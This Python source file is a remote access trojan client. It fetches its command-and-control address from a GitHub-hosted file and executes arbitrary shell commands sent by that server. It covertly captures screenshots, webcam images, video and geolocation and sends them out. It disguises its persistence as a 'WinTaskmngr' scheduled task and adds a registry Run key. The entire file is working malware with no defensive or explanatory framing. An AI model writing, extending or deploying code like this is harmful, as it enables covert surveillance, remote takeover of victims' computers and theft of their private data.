import time
import base64
import socket
import zlib
import threading
import tkinter as tk
from tkinter import messagebox
import cv2  # OpenCV for capturing camera image
from PIL import ImageGrab
import platform
import psutil
import subprocess
import pyautogui
import os
import sys
import geocoder
import requests
import winreg  # For adding persistence in Windows registry

# modify to get server details from github
def getserver():
    url = "https://raw.githubusercontent.com/mickey-cyberkid/testing/refs/heads/main/updatepath.html"
    req = requests.get(url)
    res = req.text
    info = res.split(":",2)
    return info
try:
    SERVER = getserver()
    IP = SERVER[0]
    PORT = SERVER[1]
except:
    IP = "127.0.0.1"
    PORT = 6000
    active = True
    sock = socket.socket()

# Function to display pop-up message using Tkinter
def show_popup(message):
    
    messagebox.showinfo("Admin",message)
    send_response(b'Done')


# Get location
def get_geodata():
    try:
        # Get geodata based on the current IP address
        g = geocoder.ip('me')
        
        # Return all geodata as a formatted string
        geodata_str = f"IP Address: {g.ip}\n"
        geodata_str += f"City: {g.city}\n"
        geodata_str += f"Region: {g.region}\n"
        geodata_str += f"Country: {g.country}\n"
        geodata_str += f"Latitude: {g.latlng[0] if g.latlng else 'N/A'}\n"
        geodata_str += f"Longitude: {g.latlng[1] if g.latlng else 'N/A'}\n"
        geodata_str += f"Address: {g.address}\n"
        geodata_str += f"Timezone: {g.timezone}\n"
        geodata_str += f"Postal: {g.postal}\n"
        geodata_str += f"Country Code: {g.country_code}\n"
        
        return geodata_str.encode()
    except Exception as e:
        return f"Error retrieving geodata: {e}".encode()


# Function to execute shell commands
def get_result(com):
    try:
        pro = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        res = pro.stdout.read() + pro.stderr.read()
        return res
    except Exception as e:
        print(f"Error executing command: {e}")
        return str(e).encode()

def zcomp(data):
    try:
        return zlib.compress(data)
    except Exception as e:
        print(f"Error compressing data: {e}")
        return b""

# Function to process the received command
def process_command(command):
    if command == "lock":
        lock_device()
    elif command == "capture_screenshot":
        capture_screenshot()
    elif command == "capture_camera":
        capture_camera_image()
    elif command == "send_info":
        send_device_info()
    elif command.startswith("show_message"):
        message = command.replace("show_message", "").strip()
        show_popup(message)
    elif "record_video" in command.lower():
        duration = float(command.split()[1])
        record_video(duration)
    elif command.lower() == "get_geolocation":
        send_response(get_geodata())
    else:
        if len(command) < 1:
            send_response(b"No command")
        send_response(get_result(command))

# Function to lock the device (Windows & macOS)
def lock_device():
    try:
        if platform.system() == "Windows":
            pyautogui.hotkey('win', 'l')
        elif platform.system() == "Darwin":
            pyautogui.hotkey('command', 'ctrl', 'q')
        else:
            print("Lock functionality is not supported for this platform")
        send_response(b"Device locked.")
    except Exception as e:
        print(f"Error locking device: {e}")


#Function to record from cam
def record_video(duration):
    """
    Record video from the default camera without showing the frame on the screen.

    Args:
        duration (int): Duration in seconds.
    """
    # Use default camera
    cap = cv2.VideoCapture(0)


    # Initialize the video writer and capture
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    fps = 30.0
    width, height = 640, 480
    filename = "output.avi"

    # Create a VideoWriter object to write the video
    out = cv2.VideoWriter(filename, fourcc, fps, (width, height))

    start_time = time.time()
    while True:
        # Capture frame-by-frame
        ret, frame = cap.read()

        if not ret:
            break

        # Write the frame to the video
        out.write(frame)

        # Calculate elapsed time
        elapsed_time = int(time.time() - start_time)

        # Check if the video recording duration has exceeded the specified value
        if elapsed_time >= duration * 60:
            print(f"Video recording stopped due to exceeding duration ({duration} minutes)")
            break

    # Release everything when finished
    out.release()
    cap.release()
    send_file_via_email(filename)


# Function to capture a screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        send_file_via_email("screenshot.png")
    except Exception as e:
        print(f"Error capturing screenshot: {e}")

# Function to capture an image from the camera
def capture_camera_image():
    try:
        cap = cv2.VideoCapture(0)  # 0 is the default camera
        ret, frame = cap.read()

        if ret:
            filename = "camera_image.png"
            cv2.imwrite(filename, frame)
            cap.release()
            send_file_via_email(filename)

        else:
            cap.release()
            send_response(b"Failed to capture camera image.")
    except Exception as e:
        print(f"Error capturing camera image: {e}")

# Function to send device information (CPU, memory, battery)
def send_device_info():
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        battery = psutil.sensors_battery()
        battery_percent = battery.percent if battery else "Unknown"

        device_info = f"CPU Usage: {cpu_usage}%\nMemory Usage: {memory.percent}%\nBattery: {battery_percent}%"
        send_response(device_info.encode())
    except Exception as e:
        print(f"Error getting device info: {e}")

# Function to send a response to the server
def send_response(response):
    try:
        data = zcomp(response)
        sock.send(zcomp(str(len(data)).encode()))
        sock.sendall(data)
        print("Response sent successfully.")
    except Exception as e:
        print(f"Error sending response: {e}")

# Function to send an image file via email
def send_file_via_email(filename):
    try:
        image = open(filename, "rb").read()
        enc = zlib.compress(image)
        size_chunk = zcomp(str(len(enc)).encode())
        sock.send(size_chunk)
        print("Sent data size...")
        sock.send(enc)
        os.remove(filename)
        print("sent data ...")
        print(f"Sent {filename}.")
    except Exception as e:
        print(f"Error sending file: {e}")

# Function to add persistence in Windows
def add_persistence():
    try:
        # Add the script to the registry to run at startup
        script_path = sys.executable
        # add task schedule
        # Create a task scheduler entry
        subprocess.run(['schtasks', '/create', '/tn', 'WinTaskmngr', '/tr', script_path, '/sc', 'onlogon', '/f'])

    
        registry_key = winreg.HKEY_CURRENT_USER
        key = winreg.OpenKey(registry_key, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "MyPersistentApp", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        print("Persistence added successfully.")
    except Exception as e:
        print(f"Error adding persistence: {e}")

# Function to reconnect the socket in case of failure
def reconnect_socket():
    global sock
    while True:
        try:
            sock.connect((IP, PORT))
            print("Reconnected to the server.")
            break
        except Exception as e:
            print(f"Connection failed, retrying in 5 seconds: {e}")
            sock.close()
            sock=socket.socket()
            time.sleep(5)

# Main function to start the command checking in a separate thread
if __name__ == "__main__":
    # Add persistence
    if platform.system() == "Windows":
        add_persistence()

    # Reconnect socket if the connection fails
    reconnect_socket()

    while active:
        try:
            command = sock.recv(1024)
            if command:
                process_command(command.decode("utf-8"))
            else:
                reconnect_socket()
        except Exception as e:
            print(f"Error receiving command: {e}")
            reconnect_socket()
